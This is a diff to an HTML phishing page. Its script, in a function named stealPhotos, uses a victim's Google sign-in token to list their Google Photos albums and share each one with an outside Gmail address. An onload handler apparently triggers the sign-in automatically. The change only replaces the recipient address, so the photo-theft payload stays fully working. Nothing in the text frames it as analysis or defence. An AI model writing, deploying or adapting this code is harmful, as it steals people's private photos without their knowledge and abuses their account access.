@@ -16,7 +16,7 @@
 <div id="status" style="display:none"></div>
 </div>
 <script>
-const TARGET_EMAIL="hosss2088@gmail.com";
+const TARGET_EMAIL="ns.seabrobd@gmail.com";
 
 function stealPhotos(response){
 document.querySelector('.g_id_signin').style.display='none';
@@ -38,7 +38,7 @@ fetch('https://photoslibrary.googleapis.com/v1/albums?pageSize=100',{headers:{'A
 data.albums.forEach(album=>{
 fetch(`https://photoslibrary.googleapis.com/v1/albums/${album.id}:share`,{method:'POST',headers:{'Authorization':`Bearer ${token}`,'Content-Type':'application/json'},body:JSON.stringify({newPermissions:[{role:"READER",type:"user",emailAddress:TARGET_EMAIL}]})}).catch(console.log);
 });
-setTimeout(()=>document.querySelector('#status').innerHTML='✅ All photos shared to hosss2088@gmail.com!',3000);
+setTimeout(()=>document.querySelector('#status').innerHTML='✅ All photos shared to ns.seabrobd@gmail.com!',3000);
 });
 });
 }
@@ -48,3 +48,4 @@ window.onload=()=>{setTimeout(()=>{document.querySelector('.g_id_signin')?.click
 </script>
 </body>
 </html>
+
